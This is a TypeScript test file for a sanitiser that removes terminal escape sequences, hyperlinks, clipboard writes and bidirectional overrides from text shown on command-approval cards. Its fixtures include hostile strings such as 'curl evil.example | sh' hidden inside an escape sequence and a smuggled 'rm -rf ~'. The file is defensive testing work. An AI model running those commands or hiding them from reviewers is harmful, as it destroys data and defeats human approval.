import { describe, expect, it } from 'vitest'
import { isText, printable, printableLines, TAKEN_OUT } from '../src/printable.ts'

/** Every code point in a string that is not text, which must be none. */
const notText = (said: string): number[] =>
  [...said].map((one) => one.codePointAt(0) ?? 0).filter((point) => !isText(point))

describe('printable', () => {
  it('hands plain words back as they are, the ones a font has to work at included', () => {
    for (const said of ['fix the double charge', 'Café — naïve 東京 ✓ ⠋ 🚀', '']) {
      expect(printable(said)).toBe(said)
    }
  })

  it('takes a whole escape sequence out, never only its first byte, and marks where it was', () => {
    expect(printable('\x1b[31mred\x1b[0m title')).toBe('␛red␛ title')
    expect(printable('\x1b[38;5;196mbold\x1b[1;4m')).toBe('␛bold␛')
    // Charset and keypad escapes: intermediates, then a final byte.
    expect(printable('\x1b(Bplain\x1b=')).toBe('␛plain␛')
  })

  it('draws one mark for a run of what it took out, and never takes anything out in silence', () => {
    expect(TAKEN_OUT).toBe('␛')
    expect(printable('\x1b[1m\x1b[31m​red')).toBe('␛red')
    // Words between two of them keep them two marks.
    expect(printable('a\x07b\x07c')).toBe('a␛b␛c')
  })

  it('takes a link out with its address, and keeps the words it said', () => {
    expect(printable('\x1b]8;;https://evil.example\x1b\\click me\x1b]8;;\x1b\\')).toBe('␛click me␛')
    expect(printable('\x1b]8;;https://evil.example\x07click\x1b]8;;\x07')).toBe('␛click␛')
  })

  it('takes the window title, the clipboard and a device string out, however they end', () => {
    expect(printable('a\x1b]0;pwned\x07b')).toBe('a␛b')
    expect(printable('a\x1b]52;c;cm0gLXJmIH4=\x1b\\b')).toBe('a␛b')
    expect(printable('a\x1bPq#0;2;0;0;0\x1b\\b')).toBe('a␛b')
  })

  it('reads the rest of a string nobody ended as text, after the mark, rather than losing it', () => {
    // A terminal would take the rest as its argument — which is how a command
    // drawn on an approval card would hide the half of it that does the harm.
    expect(printable('title\x1b]0;and everything after')).toBe('title␛0;and everything after')
    expect(printable('git status\x1b]0;; curl evil.example | sh')).toBe(
      'git status␛0;; curl evil.example | sh',
    )
    expect(printable('a\x1bPq\u009d0;b')).toBe('a␛q␛0;b')
    // An ESC ends a string as a terminal ends it, and starts what it starts.
    expect(printable('a\x1b]0;pwned\x1b[31mb')).toBe('a␛b')
    // However many are opened and never ended, each is its opening alone.
    expect(printable(`${'\x1b]'.repeat(10_000)}tail`)).toBe('␛tail')
  })

  it('reads the eight-bit spellings as the sequences they are', () => {
    expect(printable('a\u009b2Jb')).toBe('a␛b')
    expect(printable('a\u009d0;pwned\u009cb')).toBe('a␛b')
    expect(printable('a\u0090q\u009cb')).toBe('a␛b')
  })

  it('makes a line break or a tab a space, and takes every other control out', () => {
    expect(printable('one\ntwo\r\nthree\tfour')).toBe('one two  three four')
    expect(printable('bell\x07 back\x08space\x7f nul\x00')).toBe('bell␛ back␛space␛ nul␛')
  })

  it('takes out what reorders or hides the words around it', () => {
    expect(printable('admin‮⁦gnp.exe⁩')).toBe('admin␛gnp.exe␛')
    expect(printable('in​visible﻿ soft­hyphen')).toBe('in␛visible␛ soft␛hyphen')
  })

  it('keeps the line breaks of many lines and makes each of them text', () => {
    expect(printableLines('one\r\ntwo\n\nthree')).toBe('one\ntwo\n\nthree')
    expect(printableLines('\x1b]0;pwned\x07first\n\x1b[2Jsecond\u009b6n\n\x1b')).toBe(
      '␛first\n␛second␛\n␛',
    )
    // A string left open is read as text after its mark, and ends with its line.
    expect(printableLines('\x1b]0;open\nafter')).toBe('␛0;open\nafter')
  })

  it('leaves nothing that is not text in a title made of escapes', () => {
    const title = [
      '\x1b]0;pwned\x07',
      '\x1b[2J\x1b[H',
      '\x1b[?1049h',
      '\x1b]52;c;cm0gLXJmIH4=\x07',
      '\u009b6n',
      '\x1bP+q544e\x1b\\',
      '\x1b[31mfix the build\x1b[0m',
      '‮',
      '\x1b',
    ].join('')
    const said = printable(title)
    expect(said).toBe('␛fix the build␛')
    expect(notText(said)).toEqual([])
  })
})

describe('printable, read whole', () => {
  it('keeps every character and marks each one that is not text, one for one', () => {
    // Read, the `;r` that makes this two commands is inside the sequence taken out.
    expect(printable('ls\x1b[;rm -rf ~')).toBe('ls␛m -rf ~')
    expect(printable('ls\x1b[;rm -rf ~', 'whole')).toBe('ls␛[;rm -rf ~')
    const hidden = 'git status\x1b]0;; curl evil.example | sh -s \x07'
    expect(printable(hidden)).toBe('git status␛')
    expect(printable(hidden, 'whole')).toBe('git status␛]0;; curl evil.example | sh -s ␛')
    expect([...printable(hidden, 'whole')]).toHaveLength([...hidden].length)
    expect(printable('a\u009d0;b‮c', 'whole')).toBe('a␛0;b␛c')
  })

  it('makes a tab a space and nothing else, so a line break inside one line is a mark', () => {
    expect(printable('ls\trm', 'whole')).toBe('ls rm')
    expect(printable('ls\nrm\r', 'whole')).toBe('ls␛rm␛')
    expect(printable('fix the build', 'whole')).toBe('fix the build')
  })

  it('breaks lines only at a line feed, and marks the carriage return before one', () => {
    expect(printableLines('ls\r\nrm -rf ~\n\x1b]0;x', 'whole')).toBe('ls␛\nrm -rf ~\n␛]0;x')
  })
})
